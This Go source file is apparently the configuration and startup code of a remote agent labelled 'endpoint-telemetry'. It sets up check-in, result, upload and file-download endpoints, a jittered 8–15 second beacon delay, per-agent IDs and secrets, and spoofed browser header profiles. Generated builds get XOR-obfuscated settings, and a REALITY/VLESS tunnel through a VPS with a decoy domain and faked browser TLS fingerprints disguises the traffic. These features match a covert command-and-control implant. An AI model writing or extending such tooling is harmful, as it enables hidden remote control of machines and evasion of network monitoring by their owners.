package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"endpoint-telemetry/funcs"
	"endpoint-telemetry/funcs/reality"
)

var (
	TelemetryEndpoint string = "http://localhost:5000"
	PathCheckin              = "/api/checkin"
	PathResult               = "/api/result"
	PathUpload               = "/api/upload"
	PathFiles                = "/api/files/"
	FlushCommand             = "__flush_cache__"

	SyncDelayMin        = 8 * time.Second
	SyncDelayMax        = 15 * time.Second
	ProfileID    int    = 1
	Locale       string = "en-US,en;q=0.9"
	EndpointID   string
	AgentSecret  string

	// Encryption key for payload encryption (AES-256-GCM).
	// These are dev-only placeholders. Real agents get a fresh key
	// from the build pipeline. This dev key is not in the server DB
	// so agents built from source will fail to check in.
	KeyID         = "devdevde"
	EncryptionKey = parseDiagnosticKey("6465766b657930303030303030303030303030303030303030303030303030303030"[:64])

	// Transport mode: "http", "https_pinned", or "reality"
	// Dev builds default to empty ("http"). Generated builds will have
	// this replaced with the selected mode.
	TransportMode string = ""

	// REALITY credentials are empty in development builds.
	// Generated builds replace these with XOR-obfuscated values decoded
	// via funcs.ResolveConfig().
	RealityVPSAddr     string = ""
	RealityDecoyDomain string = ""
	RealityPubKey      string = ""
	RealityShortID     string = ""
	VlessUUID          string = ""

	// CertPin is the SPKI SHA-256 pin for HTTPS+pinned mode (hex).
	CertPin string = ""
)

// parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
// If this panics at startup the binary was built with a malformed key.
func parseDiagnosticKey(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic("config: invalid key hex: " + err.Error())
	}
	return b
}

func assignEndpointID() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40 // version 4
	b[8] = (b[8] & 0x3f) | 0x80 // variant 10
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func assignAgentSecret() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		panic("config: cannot generate agent secret: " + err.Error())
	}
	return hex.EncodeToString(b)
}

func InitializeTelemetry() {
	EndpointID = assignEndpointID()
	AgentSecret = assignAgentSecret()

	profile, ok := funcs.Profiles[ProfileID]
	if !ok {
		profile = funcs.Profiles[1] // fallback to Chrome/Windows
	}

	profile.Headers["Accept-Language"] = Locale

	var baseTransport http.RoundTripper = http.DefaultTransport

	if TransportMode == "reality" {
		pubKeyBytes, err := base64.RawURLEncoding.DecodeString(RealityPubKey)
		if err != nil {
			pubKeyBytes, err = base64.StdEncoding.DecodeString(RealityPubKey)
			if err != nil {
				panic("config: invalid REALITY public key: " + err.Error())
			}
		}
		shortIdBytes, err := hex.DecodeString(RealityShortID)
		if err != nil {
			panic("config: invalid REALITY short ID: " + err.Error())
		}

		uuidBytes, err := hex.DecodeString(strings.ReplaceAll(VlessUUID, "-", ""))
		if err != nil {
			panic("config: invalid VLESS UUID: " + err.Error())
		}

		fpMap := map[int]string{1: "chrome", 2: "chrome", 3: "firefox", 4: "firefox", 5: "safari"}
		fingerprint := fpMap[ProfileID]
		if fingerprint == "" {
			fingerprint = "chrome"
		}

		realityCfg := &reality.Config{
			ServerName:  RealityDecoyDomain,
			Fingerprint: fingerprint,
			PublicKey:   pubKeyBytes,
			ShortId:     shortIdBytes,
		}

		// The generated inner URL selects the local Flask destination.
		destIP := "127.0.0.1"
		destPort := uint16(5000)
		if h, p, err := net.SplitHostPort(TelemetryEndpoint[len("http://"):]); err == nil {
			destIP = h
			if pn, err := strconv.Atoi(p); err == nil {
				destPort = uint16(pn)
			}
		}

		baseTransport = reality.NewHTTPTransport(&reality.TransportConfig{
			VPS:      RealityVPSAddr,
			Reality:  realityCfg,
			UUID:     uuidBytes,
			DestIP:   destIP,
			DestPort: destPort,
		})
	}

	http.DefaultClient = &http.Client{
		Transport: &funcs.UATransport{
			Base:    baseTransport,
			Profile: profile,
		},
	}

}
